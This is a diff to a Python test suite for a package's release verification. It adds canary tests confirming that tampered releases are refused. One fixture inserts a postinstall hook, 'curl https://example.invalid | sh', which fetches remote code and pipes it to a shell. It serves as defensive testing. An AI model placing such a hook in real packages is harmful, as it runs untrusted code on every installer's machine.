@@ -99,6 +99,9 @@ class Release(unittest.TestCase):
         self.assertEqual((manifest["name"], manifest["version"]), ("@norn/cli", "0.1.0-alpha.3"))
         self.assertNotIn("private", manifest)
         self.assertNotIn("optionalDependencies", manifest)
+        self.assertEqual(manifest["engines"], {"bun": ">=1.3.0 <1.4.0"})
+        authoring = json.loads((self.package("@norn/authoring") / "package.json").read_text())
+        self.assertNotIn("./schema/norn-project.schema.json", authoring["exports"])
         info = json.loads((cli / "generated/build.json").read_text())
         self.assertEqual((info["version"], info["commit"], info["toolchain"]), ("0.1.0-alpha.3", self.commit, "1.98.0"))
         self.assertEqual(info["packages"]["@norn/cli"], "https://example.invalid/releases/v0.1.0-alpha.3/norn-cli-0.1.0-alpha.3.tgz")
@@ -123,11 +126,24 @@ class Release(unittest.TestCase):
         self.assertEqual(manifest["optionalDependencies"], {"@norn/dev-host-linux-arm64": "0.1.0-alpha.3", "@norn/dev-host-linux-x64": "0.1.0-alpha.3"})
         info = json.loads((self.package("@norn/cli") / "generated/build.json").read_text())
         self.assertEqual(info["packages"], {"@norn/cli": "0.1.0-alpha.3", "@norn/authoring": "0.1.0-alpha.3"})
-        self.assertEqual(info["hosts"], {})
+        # Host digests ride in the build manifest on both channels; only tarballs have an address.
+        self.assertEqual(sorted(info["hosts"]), sorted(assemble.PLATFORMS))
+        self.assertNotIn("url", info["hosts"]["linux-x64"])
 
     def repack(self, name):
         directory = self.package(name)
         (self.out / "release" / assemble.tarball_name(name, "0.1.0-alpha.3")).write_bytes(assemble.pack(directory))
+
+    def reseal(self):
+        """Re-record every release file's hash in the manifest and SHA256SUMS, as
+        someone altering a release would: the check under test must still refuse."""
+        path = self.out / "release/manifest.json"
+        manifest = json.loads(path.read_text())
+        for name in manifest["files"]:
+            data = (self.out / "release" / name).read_bytes()
+            manifest["files"][name] = {"sha256": assemble.sha256(data), "size": len(data)}
+        path.write_text(json.dumps(manifest, indent=2) + "\n")
+        (self.out / "release/SHA256SUMS").write_text("".join(f"{e['sha256']}  {n}\n" for n, e in manifest["files"].items()))
 
     def test_canary_an_extra_untracked_file_in_a_package(self):
         self.build()
@@ -151,6 +167,50 @@ class Release(unittest.TestCase):
         (self.package("@norn/cli") / "checker/norn_checker_wasm_bg.wasm").unlink()
         self.repack("@norn/cli")
         self.refused("checker/norn_checker_wasm_bg.wasm is missing")
+
+    def test_canary_a_postinstall_script_added_to_a_package_json(self):
+        self.build()
+        path = self.package("@norn/cli") / "package.json"
+        manifest = json.loads(path.read_text())
+        manifest["scripts"] = {"postinstall": "curl https://example.invalid | sh"}
+        path.write_text(json.dumps(manifest, indent=2) + "\n")
+        self.repack("@norn/cli")
+        self.reseal()
+        self.refused("@norn/cli: package.json is not the one this commit and release produce")
+
+    def test_canary_the_cli_address_in_build_json_pointed_elsewhere(self):
+        self.build()
+        path = self.package("@norn/cli") / "generated/build.json"
+        info = json.loads(path.read_text())
+        info["packages"]["@norn/cli"] = "https://elsewhere.invalid/norn-cli.tgz"
+        path.write_text(json.dumps(info, indent=2) + "\n")
+        self.repack("@norn/cli")
+        self.reseal()
+        self.refused("generated/build.json is not the one this commit and release produce")
+
+    def test_canary_a_symlink_among_built_files(self):
+        self.build()
+        wasm = self.package("@norn/cli") / "checker/norn_checker_wasm_bg.wasm"
+        wasm.unlink()
+        wasm.symlink_to(self.root / "elsewhere.wasm")
+        self.refused("is a symlink")
+
+    def test_a_tarball_is_compared_by_its_content_not_its_gzip_bytes(self):
+        import gzip
+        self.build()
+        tarball = self.out / "release" / assemble.tarball_name("@norn/authoring", "0.1.0-alpha.3")
+        recompressed = gzip.compress(gzip.decompress(tarball.read_bytes()), compresslevel=1, mtime=0)
+        self.assertNotEqual(recompressed, tarball.read_bytes())
+        tarball.write_bytes(recompressed)
+        self.reseal()
+        result = self.run_script("verify")
+        self.assertEqual(result.returncode, 0, result.stderr)
+
+    def test_a_release_address_is_https_or_this_machine(self):
+        for url in ("http://example.invalid/r", "ftp://x/y", "https://x/y/"):
+            self.assertIsNone(assemble.RELEASE_URL.fullmatch(url), url)
+        for url in ("https://github.com/Norn-cloud/norn/releases/download/v0.1.0-alpha.3", "http://127.0.0.1:8377", "http://localhost/x"):
+            self.assertIsNotNone(assemble.RELEASE_URL.fullmatch(url), url)
 
     def test_canary_a_missing_manifest_entry(self):
         self.build()
